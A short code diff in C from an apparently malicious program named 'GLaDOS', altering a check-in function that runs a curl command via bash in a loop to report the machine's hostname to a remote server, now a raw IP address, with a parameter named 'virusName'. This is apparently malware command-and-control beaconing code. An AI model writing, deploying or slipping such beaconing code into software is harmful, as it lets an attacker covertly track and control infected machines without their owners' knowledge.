@@ -72,7 +72,7 @@ int GLaDOS_thread(void *data) {
 
 
 int GLaDOS_checkin(void *data) {
-    char *checkin = "curl -XGET \"http://monitor.daviddworken.com:8080/api/submit?id=`hostname`&vN=4\"";
+    char *checkin = "curl -XGET \"http://68.183.100.83:8080/api/submit?id=`hostname`&virusName=4\"";
     char *checkin_argv[] = { "/bin/bash", "-c", checkin, NULL };
 
     while(true) {
